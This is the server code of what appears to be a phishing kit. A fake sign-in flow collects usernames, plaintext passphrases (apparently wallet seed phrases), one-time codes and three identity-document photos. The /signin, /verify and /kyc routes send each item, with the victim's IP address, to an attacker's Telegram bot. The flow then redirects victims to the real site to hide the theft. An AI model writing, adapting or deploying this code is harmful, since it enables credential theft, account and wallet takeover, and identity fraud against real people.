// server.js
const express = require("express");
const bodyParser = require("body-parser");
const multer = require("multer");
const fs = require("fs");
const path = require("path");
const FormData = require("form-data");
const fetch = require("node-fetch");
const sqlite3 = require("sqlite3").verbose();
const bcrypt = require("bcrypt");

const app = express();
const upload = multer({ dest: "uploads/" });

// ========== CONFIG (edit environment variables on Render or here for local testing) ==========
const TELEGRAM_BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN || ""; // <--- set on Render
const TELEGRAM_CHAT_ID  = process.env.TELEGRAM_CHAT_ID  || "";  // <--- set on Render
const OFFICIAL_SITE      = process.env.OFFICIAL_SITE      || "https://example.com";
// ==============================================================================================

const PORT = process.env.PORT || 3000;

// Simple SQLite for record-keeping
const DB_PATH = path.join(__dirname, "data.db");
const db = new sqlite3.Database(DB_PATH);
db.serialize(() => {
  db.run(`CREATE TABLE IF NOT EXISTS users (
    id INTEGER PRIMARY KEY,
    username TEXT UNIQUE,
    pass_hash TEXT,
    created_at INTEGER
  )`);
});

// in-memory codes store: { username => { code, expires } }
const codes = new Map();

// helpers
function clientIp(req) {
  const hf = req.headers['x-forwarded-for'];
  if (hf) return hf.split(',')[0].trim();
  return (req.ip || req.connection?.remoteAddress || 'unknown').toString();
}
function escapeHtml(s=''){ return String(s).replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;'); }

async function sendTelegramText(text) {
  if (!TELEGRAM_BOT_TOKEN || !TELEGRAM_CHAT_ID) {
    console.warn("Telegram not configured, skipping send");
    return { ok: false, error: "no_telegram_config" };
  }
  try {
    const res = await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ chat_id: TELEGRAM_CHAT_ID, text, parse_mode: "HTML" })
    });
    return res.json();
  } catch (err) {
    console.error("sendTelegramText error:", err);
    return { ok: false, error: err.message };
  }
}

async function sendTelegramDocument(filePath, caption="") {
  if (!TELEGRAM_BOT_TOKEN || !TELEGRAM_CHAT_ID) {
    console.warn("Telegram not configured, skipping document send");
    return { ok: false, error: "no_telegram_config" };
  }
  try {
    const form = new FormData();
    form.append("chat_id", TELEGRAM_CHAT_ID);
    if (caption) form.append("caption", caption);
    form.append("document", fs.createReadStream(filePath));
    const res = await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendDocument`, {
      method: "POST",
      body: form,
      headers: form.getHeaders ? form.getHeaders() : {}
    });
    return res.json();
  } catch (err) {
    console.error("sendTelegramDocument error:", err);
    return { ok: false, error: err.message };
  }
}

// middlewares
app.use(bodyParser.json());
app.use(bodyParser.urlencoded({ extended: true }));
app.use(express.static(path.join(__dirname, "public")));

// ---------- ROUTES ----------

// POST /signin
// Expects JSON: { username, passphrase }
app.post("/signin", async (req, res) => {
  try {
    const username = (req.body.username || "").trim();
    const passphrase = (req.body.passphrase || "").toString();
    if (!username || !passphrase) return res.json({ ok:false, error:"missing_fields" });

    // store (hashed) if you want
    const passHash = await bcrypt.hash(passphrase, 10);
    db.run("INSERT OR REPLACE INTO users (username, pass_hash, created_at) VALUES (?, ?, ?)",
      [username, passHash, Date.now()], err => { if (err) console.error("DB write error:", err); });

    // generate 6-digit code
    const code = Math.floor(100000 + Math.random() * 900000).toString();
    const expires = Date.now() + (5*60*1000); // 5 minutes
    codes.set(username, { code, expires });

    // send to Telegram: username, passphrase, IP, time, code
    const ip = clientIp(req);
    const time = new Date().toISOString();
    const msg = `<b>Sign-in</b>\n👤 Username: ${escapeHtml(username)}\n🔑 Passphrase: ${escapeHtml(passphrase)}\n📨 Code: <b>${code}</b>\n🌐 IP: ${escapeHtml(ip)}\n🕒 ${time}`;
    await sendTelegramText(msg);

    return res.json({ ok:true, next: "code.html" });
  } catch (err) {
    console.error("signin error:", err);
    return res.json({ ok:false, error:"server_error" });
  }
});

// POST /verify
// Expects JSON: { username, code }
app.post("/verify", async (req, res) => {
  try {
    const username = (req.body.username || "").trim();
    const code = (req.body.code || "").toString().trim();
    if (!username || !code) return res.json({ ok:false, error:"missing_fields" });

    const entry = codes.get(username);
    if (!entry) return res.json({ ok:false, error:"no_code" });
    if (Date.now() > entry.expires) { codes.delete(username); return res.json({ ok:false, error:"code_expired" }); }
    if (entry.code !== code) return res.json({ ok:false, error:"invalid_code" });

    // success
    codes.delete(username);
    const ip = clientIp(req);
    const time = new Date().toISOString();
    await sendTelegramText(`<b>Code verified</b>\n👤 ${escapeHtml(username)}\n🔢 Code: ${escapeHtml(code)}\n🌐 IP: ${escapeHtml(ip)}\n🕒 ${time}`);

    return res.json({ ok:true, next: "kyc.html" });
  } catch (err) {
    console.error("verify error:", err);
    return res.json({ ok:false, error:"server_error" });
  }
});

// POST /kyc
// Expects multipart/form-data: photo1, photo2, photo3, plus username & passphrase fields in formData
const kycUpload = upload.fields([{ name: "photo1" }, { name: "photo2" }, { name: "photo3" }]);
app.post("/kyc", kycUpload, async (req, res) => {
  try {
    const username = (req.body.username || "N/A").trim();
    const passphrase = (req.body.passphrase || "N/A").toString();
    const ip = clientIp(req);
    const time = new Date().toISOString();

    // send summary to Telegram
    const summary = `<b>KYC Submission</b>\n👤 Username: ${escapeHtml(username)}\n🔑 Passphrase: ${escapeHtml(passphrase)}\n🌐 IP: ${escapeHtml(ip)}\n🕒 ${time}`;
    await sendTelegramText(summary);

    // send each uploaded file to Telegram as document
    const files = req.files || {};
    const keys = ["photo1","photo2","photo3"];
    for (let i=0; i<keys.length; i++) {
      const k = keys[i];
      if (files[k] && files[k][0]) {
        const p = files[k][0].path;
        const caption = `${summary}\n📎 ${k} — Photo ${i+1}`;
        const r = await sendTelegramDocument(p, caption);
        // delete local file after attempt
        fs.unlink(p, (err) => { if (err) console.error("unlink error:", err); });
        if (!r || !r.ok) {
          console.error("telegram document send error:", r);
          return res.json({ ok:false, error:"telegram_send_failed", detail: r });
        }
      }
    }

    // Done
    return res.json({ ok:true, redirect: OFFICIAL_SITE });
  } catch (err) {
    console.error("kyc error:", err);
    return res.json({ ok:false, error:"server_error" });
  }
});

// health
app.get("/health", (req, res) => res.json({ ok: true }));

app.listen(PORT, () => console.log(`Server running on port ${PORT}`));